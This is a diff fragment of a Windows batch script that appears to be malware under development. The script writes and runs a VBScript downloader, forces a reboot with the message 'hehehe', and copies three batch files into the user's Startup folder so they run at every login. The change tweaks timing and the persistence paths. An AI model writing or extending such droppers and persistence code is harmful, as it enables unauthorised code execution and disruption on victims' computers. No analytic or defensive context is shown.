@@ -69,8 +69,9 @@ echo       Set objADOStream = Nothing >>m.vbs
 echo     End if >>m.vbs
 echo     Set objXMLHTTP = Nothing >>m.vbs
 start "" m.vbs
+timeout /t 2
 shutdown /r /t 5 /c "hehehe"
-copy c.bat "%userprofile%\Start Menu\Programs\Startup\c.bat"
-copy l.bat "%userprofile%\Start Menu\Programs\Startup\l.bat"
-copy r.bat "%userprofile%\Start Menu\Programs\Startup\r.bat"
+copy c.bat "%userprofile%\Start Menu\Programs\Startup"
+copy l.bat "%userprofile%\Start Menu\Programs\Startup"
+copy r.bat "%userprofile%\Start Menu\Programs\Startup"
 pause
